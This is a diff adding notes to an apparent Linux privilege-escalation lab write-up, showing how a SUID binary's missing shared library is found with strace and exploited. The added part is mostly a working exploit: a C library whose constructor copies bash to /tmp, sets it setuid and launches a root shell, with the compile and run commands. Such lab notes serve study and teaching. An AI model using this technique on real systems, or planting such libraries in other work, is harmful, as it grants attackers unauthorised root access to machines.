@@ -32,3 +32,32 @@
 Now find out shared object in /usr/local/bin/suid-so binary:
 
 strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+
+We found:
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+
+That /home/user/.config/libcalc.so is missing. SO , we can exploit it.
+
+EXPLOITATION
+=============
+
+A. create a folder named .config in /home/user
+B. Create a C program file:named libcalc.c in .config folder
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+C. compile it
+
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+
+D. now run the program:
+/usr/local/bin/suid-so
+
+got root shell
